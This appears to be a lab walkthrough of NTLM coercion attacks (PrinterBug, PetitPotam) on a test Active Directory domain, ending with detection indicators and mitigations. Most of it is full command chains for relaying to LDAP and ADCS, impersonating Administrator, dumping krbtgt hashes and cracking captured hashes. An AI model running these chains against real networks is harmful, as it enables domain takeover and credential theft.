# Coercion Attacks (PrinterBug / PetitPotam)

## Overview

Coercion attacks **force a machine to authenticate** to an attacker-controlled host using NTLM. Once the DC authenticates to you, you can:

- **Relay** the NTLM authentication to LDAP/LDAPS → ESC8 or Resource-Based Constrained Delegation
- **Relay** to SMB → code execution
- **Capture** NTLMv1/NTLMv2 hash → crack offline

## Lab Misconfigurations Enabled

`Setup-ExtraAttacks.ps1`:
- Enables **Print Spooler** service (`Spooler`) → PrinterBug (MS-RPRN)
- Enables **WebClient** service → WebDAV relay (HTTP coercion)
- Sets **NTLMv1** (`LmCompatibilityLevel = 1`) → weaker hash, easier to crack/relay

## Techniques

### 1. PrinterBug (MS-RPRN) — Spooler Service

Abuses the `RpcRemoteFindFirstPrinterChangeNotificationEx` RPC call.

```bash
# Check if Spooler is running on DC-01
crackmapexec smb 192.168.56.10 -u attacker.01 -p p@ssw0rd -M spooler

# Trigger coercion — DC-01 authenticates to 192.168.56.30 (WS-01)
python3 printerbug.py corp.local/attacker.01:p@ssw0rd@192.168.56.10 192.168.56.30
```

### 2. PetitPotam (MS-EFSRPC) — No Spooler Needed

```bash
# Coerce DC-01 to authenticate to WS-01
python3 PetitPotam.py 192.168.56.30 192.168.56.10

# Authenticated variant (if unauthenticated is patched):
python3 PetitPotam.py -u attacker.01 -p p@ssw0rd -d corp.local 192.168.56.30 192.168.56.10
```

### 3. Coercer — All-in-one

```bash
# Tries all coercion methods automatically
coercer coerce -l 192.168.56.30 -t 192.168.56.10 \
  -u attacker.01 -p p@ssw0rd -d corp.local
```

## Attack Path A — Relay to LDAP (RBCD)

```bash
# Step 1: Set up NTLM relay on WS-01 (192.168.56.30)
ntlmrelayx.py \
  -t ldap://192.168.56.10 \
  --delegate-access \
  --escalate-user attacker.01

# Step 2: Trigger coercion (different terminal)
python3 PetitPotam.py 192.168.56.30 192.168.56.10

# Step 3: ntlmrelayx creates a machine account with delegation rights
# Step 4: Impersonate DC-01 and get a TGS as Administrator
getST.py corp.local/NEWMACHINE\$:password \
  -spn cifs/DC-01.corp.local \
  -impersonate Administrator \
  -dc-ip 192.168.56.10

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass DC-01.corp.local
```

## Attack Path B — Relay to ADCS (ESC8)

```bash
# Step 1: Relay to ADCS HTTP enrollment
ntlmrelayx.py \
  -t http://DC-01.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Step 2: Coerce DC-01
python3 PetitPotam.py 192.168.56.30 192.168.56.10

# Step 3: ntlmrelayx obtains a certificate for DC-01$
# Step 4: Use PKINIT to get DC-01$ TGT
gettgtpkinit.py -pfx-base64 <cert_b64> corp.local/DC-01\$ DC01.ccache

# Step 5: DCSync via U2U
export KRB5CCNAME=DC01.ccache
getnthash.py corp.local/DC-01\$ -key <session_key>
secretsdump.py -just-dc-user krbtgt corp.local/DC-01\$@192.168.56.10 -hashes :<machine_hash>
```

## Attack Path C — Capture NTLMv1 Hash

```bash
# Step 1: Start Responder (captures NTLM auth)
responder -I eth1 -v

# Step 2: Coerce DC-01 to authenticate to WS-01
python3 printerbug.py corp.local/attacker.01:p@ssw0rd@192.168.56.10 192.168.56.30

# Step 3: Responder captures DC-01$::CORP::... NTLMv1 hash
# Step 4: Crack with hashcat
hashcat -m 5500 captured.txt /usr/share/wordlists/rockyou.txt  # NTLMv1
hashcat -m 5600 captured.txt /usr/share/wordlists/rockyou.txt  # NTLMv2
```

## Why NTLMv1 Matters

`Setup-ExtraAttacks.ps1` sets `LmCompatibilityLevel = 1` (NTLMv1 accepted). NTLMv1 hashes are:
- Faster to crack (3×DES based)
- Can be cracked via rainbow tables (crack.sh)
- No salting → identical plaintext = identical hash

## Tools Needed

```bash
pip install impacket
git clone https://github.com/topotam/PetitPotam
git clone https://github.com/dirkjanm/krbrelayx
apt install responder
```

## Detection

| Indicator | Event ID |
|-----------|----------|
| Unexpected outbound NTLM auth from DC | 4624 on attacker's machine |
| Spooler RPC call from non-printer client | Network capture |
| Machine account created by non-admin | 4741 |
| Certificate request for DC account | ADCS logs |

## Mitigations (Disabled in This Lab)

- Disable Print Spooler on DCs (`Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`)
- Block NTLM to DCs via GPO (`Network security: Restrict NTLM`)
- Set `LmCompatibilityLevel = 5` (NTLMv2 only)
- Enable LDAP signing + channel binding (prevents relay to LDAP)
- Patch PetitPotam: KB5005413
